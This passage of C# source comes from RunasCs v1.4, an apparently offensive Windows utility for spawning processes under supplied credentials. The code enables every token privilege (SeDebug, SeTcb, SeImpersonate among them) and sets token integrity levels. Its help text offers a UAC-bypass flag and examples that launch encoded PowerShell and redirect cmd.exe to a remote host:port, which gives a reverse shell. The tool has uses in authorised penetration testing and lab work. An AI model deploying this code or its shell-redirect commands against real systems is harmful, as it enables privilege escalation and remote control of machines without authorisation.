    // thanks @winlogon0 --> https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode2.cs
    public static bool SetTokenIntegrityLevel(IntPtr hToken, IntegrityLevel integrity)
    {
        bool ret = false;
        IntPtr pLabelAuthorityStruct;
        IntPtr pSID;
        IntPtr pLabel;
        int labelSize;
        TOKEN_MANDATORY_LABEL tokenLabel = new TOKEN_MANDATORY_LABEL();
        SID_IDENTIFIER_AUTHORITY authoritySid = new SID_IDENTIFIER_AUTHORITY();
        authoritySid.Value = MANDATORY_LABEL_AUTHORITY;
        pLabelAuthorityStruct = Marshal.AllocHGlobal(Marshal.SizeOf(authoritySid));
        Marshal.StructureToPtr(authoritySid, pLabelAuthorityStruct, false);
        bool success = AllocateAndInitializeSid(pLabelAuthorityStruct, 1, (int)integrity, 0, 0, 0, 0, 0, 0, 0, out pSID);
        tokenLabel.Label.pSID = pSID;
        tokenLabel.Label.Attributes = TokenGroupAttributes.SE_GROUP_INTEGRITY;
        labelSize = Marshal.SizeOf(tokenLabel);
        pLabel = Marshal.AllocHGlobal(labelSize);
        Marshal.StructureToPtr(tokenLabel, pLabel, false);
        success = SetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pLabel, labelSize);
        Marshal.FreeHGlobal(pLabel);
        Marshal.FreeHGlobal(pSID);
        Marshal.FreeHGlobal(pLabelAuthorityStruct);
        if (!success)
            throw new RunasCsException("[!] Failed to set the token's Integrity Level: " + integrity.ToString());
        else
            ret = true;
        return ret;
    }

    public static IntegrityLevel GetTokenIntegrityLevel(IntPtr hToken)
    {
        IntegrityLevel illevel = IntegrityLevel.Unknown;
        IntPtr pb = Marshal.AllocHGlobal(1000);
        uint cb = 1000;
        if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pb, cb, out cb))
        {
            IntPtr pSid = Marshal.ReadIntPtr(pb);
            int dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)));
            if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
            {
                return IntegrityLevel.Low;
            }
            else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
            {
                // Medium Integrity
                return IntegrityLevel.Medium;
            }
            else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
            {
                // High Integrity
                return IntegrityLevel.High;
            }
            else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
            {
                // System Integrity
                return IntegrityLevel.System;
            }
            return IntegrityLevel.Unknown;
        }
        Marshal.FreeHGlobal(pb);
        return illevel;
    }

    public static string EnableAllPrivileges(IntPtr token)
    {
        string output = "";
        string[] privileges = { "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeDelegateSessionUserImpersonatePrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };
        foreach (string privilege in privileges)
        {
            output += EnablePrivilege(privilege, token);
        }
        return output;
    }

}

public static class RunasCsMainClass
{
    private static string help = @"
RunasCs v1.4 - @splinter_code

Usage:
    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--create-profile] [--bypass-uac]

Description:
    RunasCs is an utility to run specific processes under a different user account
    by specifying explicit credentials. In contrast to the default runas.exe command
    it supports different logon types and crateProcess functions to be used, depending
    on your current permissions. Furthermore it allows input/output redirection (even
    to remote hosts) and you can specify the password directly on the command line.

Positional arguments:
    username                username of the user
    password                password of the user
    cmd                     command supported by cmd.exe if process_timeout>0
                            commandline for the process if process_timeout=0
Optional arguments:
    -d, --domain domain
                            domain of the user, if in a domain. 
                            Default: """"
    -f, --function create_process_function
                            CreateProcess function to use. When not specified
                            RunasCs determines an appropriate CreateProcess
                            function automatically according to your privileges.
                            0 - CreateProcessAsUserW
                            1 - CreateProcessWithTokenW
                            2 - CreateProcessWithLogonW
    -l, --logon-type logon_type
                            the logon type for the spawned process.
                            Default: ""8"" - NetworkCleartext
    -r, --remote host:port
                            redirect stdin, stdout and stderr to a remote host.
                            Using this option sets the process timeout to 0.
    -t, --timeout process_timeout
                            the waiting time (in ms) for the created process.
                            This will halt RunasCs until the spawned process
                            ends and sent the output back to the caller.
                            If you set 0 no output will be retrieved and cmd.exe
                            won't be used to spawn the process.
                            Default: ""120000""
    -p, --create-profile
                            if this flag is specified RunasCs will force the
                            creation of the user profile on the machine.
                            This will ensure the process will have the
                            environment variables correctly set.
                            NOTE: in some cases, this will leave some forensics
                            traces behind creating the user profile directory.
    -b, --bypass-uac     
                            if this flag is specified RunasCs will try a UAC
                            bypass to spawn a process without token limitation
                            (not filtered).

Examples:
    Run a command as a specific local user
        RunasCs.exe user1 password1 whoami
    Run a command as a specific domain user and interactive logon type (2)
        RunasCs.exe user1 password1 whoami -d domain -l 2
    Run a background/async process as a specific local user,
        RunasCs.exe user1 password1 ""%COMSPEC% powershell -enc..."" -t 0
    Redirect stdin, stdout and stderr of the specified command to a remote host
        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
    Run a command simulating the /netonly flag of runas.exe 
        RunasCs.exe user1 password1 whoami -d domain -l 9
    Run a command as an Administrator bypassing UAC
        RunasCs.exe adm1 password1 ""whoami /priv"" --bypass-uac
";
    
    // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
    private static Dictionary<int,string> getLogonTypeDict()
    {
        Dictionary<int,string> logonTypes = new Dictionary<int,string>();
        logonTypes.Add(2, "Interactive");
        logonTypes.Add(3, "Network");
        logonTypes.Add(4, "Batch");
        logonTypes.Add(5, "Service");
        logonTypes.Add(7, "Unlock");
        logonTypes.Add(8, "NetworkCleartext");
        logonTypes.Add(9, "NewCredentials");
        logonTypes.Add(10,"RemoteInteractive");
        logonTypes.Add(11,"CachedInteractive");
        return logonTypes;
    }

    // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
    private static Dictionary<int,string> getCreateProcessFunctionDict()
    {
        Dictionary<int,string> createProcessFunctions = new Dictionary<int,string>();
        createProcessFunctions.Add(0, "CreateProcessAsUserW");
        createProcessFunctions.Add(1, "CreateProcessWithTokenW");
        createProcessFunctions.Add(2, "CreateProcessWithLogonW");
        return createProcessFunctions;
    }

    private static bool HelpRequired(string param)
    {
        return param == "-h" || param == "--help" || param == "/?";
    }
    
    private static uint ValidateProcessTimeout(string timeout)
    {
        uint processTimeout = 120000;
        try {
            processTimeout = Convert.ToUInt32(timeout);
        }
        catch {
            throw new RunasCsException("Invalid process_timeout value: " + timeout);
        }
        return processTimeout;
    }

    private static string[] ValidateRemote(string remote)
    {
        string[] split = remote.Split(':');
        if( split.Length != 2 ) {
            string error = "Invalid remote value: " + remote + "\r\n";
            error += "[-] Expected format: 'host:port'";
            throw new RunasCsException(error);
        }
        return split;
    }
    
    private static int ValidateLogonType(string type)
    {
        int logonType = 3;
        Dictionary<int,string> logonTypes = getLogonTypeDict();

        try {
            logonType = Convert.ToInt32(type);
            if( !logonTypes.ContainsKey(logonType) ) {
                throw new System.ArgumentException("");
            }
        }
        catch {
            string error = "Invalid logon_type value: " + type + "\r\n";
            error += "[-] Allowed values are:\r\n";
            foreach(KeyValuePair<int,string> item in logonTypes) {
                error += String.Format("[-]     {0}\t{1}\r\n", item.Key, item.Value);
            }
            throw new RunasCsException(error);
        }
        return logonType;
    }
    
    private static int ValidateCreateProcessFunction(string function)
    {
        int createProcessFunction = 2;
        Dictionary<int,string> createProcessFunctions = getCreateProcessFunctionDict();
        try {
            createProcessFunction = Convert.ToInt32(function);
            if( createProcessFunction < 0 || createProcessFunction > 2 ) {
                throw new System.ArgumentException("");
            }
        }
        catch {
            string error = "Invalid createProcess function: " + function + "\r\n";
            error += "[-] Allowed values are:\r\n";
            foreach(KeyValuePair<int,string> item in createProcessFunctions) {
                error += String.Format("[-]     {0}\t{1}\r\n", item.Key, item.Value);
            }
            throw new RunasCsException(error);
        }
        return createProcessFunction;
    }

    private static int DefaultCreateProcessFunction()
    {
        int createProcessFunction = 2;
        IntPtr currentTokenHandle = WindowsIdentity.GetCurrent().Token;        

        List<string[]> privs = new List<string[]>();
        privs = AccessToken.GetTokenPrivileges(currentTokenHandle);

        bool SeAssignPrimaryTokenPrivilegeAssigned = false;
        bool SeImpersonatePrivilegeAssigned = false;

        foreach (string[] s in privs)
        {
            string privilege = s[0];
            if(privilege == "SeAssignPrimaryTokenPrivilege")
                SeAssignPrimaryTokenPrivilegeAssigned = true;
            if(privilege == "SeImpersonatePrivilege")
                SeImpersonatePrivilegeAssigned = true;
        }
        if (SeAssignPrimaryTokenPrivilegeAssigned)
            createProcessFunction = 0;
        else 
            if (SeImpersonatePrivilegeAssigned)
                createProcessFunction = 1;

        return createProcessFunction;
    }

    public static string RunasCsMain(string[] args)
    {
        string output = "";
        if (args.Length == 1 && HelpRequired(args[0]))
        {
            Console.Out.Write(help);
            return "";
        }

        List<string> positionals = new List<string>();
        string username, password, cmd, domain;
        username = password = cmd = domain = string.Empty;
        string[] remote = null;
        uint processTimeout = 120000;
        int logonType = 8, createProcessFunction = DefaultCreateProcessFunction();
        bool createUserProfile = false, bypassUac = false;
        
        try {
            for(int ctr = 0; ctr < args.Length; ctr++) {
                switch (args[ctr])
                {

                    case "-d":
                    case "--domain":
                        domain = args[++ctr];
                        break;

                    case "-t":
                    case "--timeout":
                        processTimeout = ValidateProcessTimeout(args[++ctr]);
                        break;

                    case "-l":
                    case "--logon-type":
                        logonType = ValidateLogonType(args[++ctr]);
                        break;

                    case "-f":
                    case "--function":
                        createProcessFunction = ValidateCreateProcessFunction(args[++ctr]);
                        break;

                    case "-r":
                    case "--remote":
                        remote = ValidateRemote(args[++ctr]);
                        break;
                    
                    case "-p":
                    case "--create-profile":
                        createUserProfile = true;
                        break;

                    case "-b":
                    case "--bypass-uac":
                        bypassUac = true;
                        break;

                    default:
                        positionals.Add(args[ctr]);
                        break;
                }
            }
        } catch(System.IndexOutOfRangeException) {
            return "[-] Invalid arguments. Use --help for additional help.";
        } catch(RunasCsException e) {
            return String.Format("{0}", e.Message);
        }

        if( positionals.Count < 3 ) {
            return "[-] Not enough arguments. 3 Arguments required. Use --help for additional help.";
        }

        username = positionals[0];
        password = positionals[1];
        cmd = positionals[2];

        if( remote != null ) {
            processTimeout = 0;
        }

        RunasCs invoker = new RunasCs();
        try {
            output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, createUserProfile, bypassUac);
        } catch(RunasCsException e) {
            invoker.CleanupHandles();
            output = String.Format("{0}", e.Message);
        }

        return output;
    }
}

class MainClass
{

    static void Main(string[] args)
    {
        string[] argsTest = new string[10];
        argsTest[0] = "temp8";
        argsTest[1] = "pwd";
        argsTest[2] = "cmd /c set";
        //argsTest[2] = "ping -n 30 127.0.0.1";
        argsTest[3] = "--function";
        argsTest[4] = "0";
        argsTest[5] = "--logon-type";
        argsTest[6] = "8";
        //argsTest[7] = "--create-profile";
        Console.Out.Write(RunasCsMainClass.RunasCsMain(argsTest));
    }
}

/*
class MainClass{
    static void Main(string[] args)
    {
        Console.Out.Write(RunasCsMainClass.RunasCsMain(args));
    }
}
*/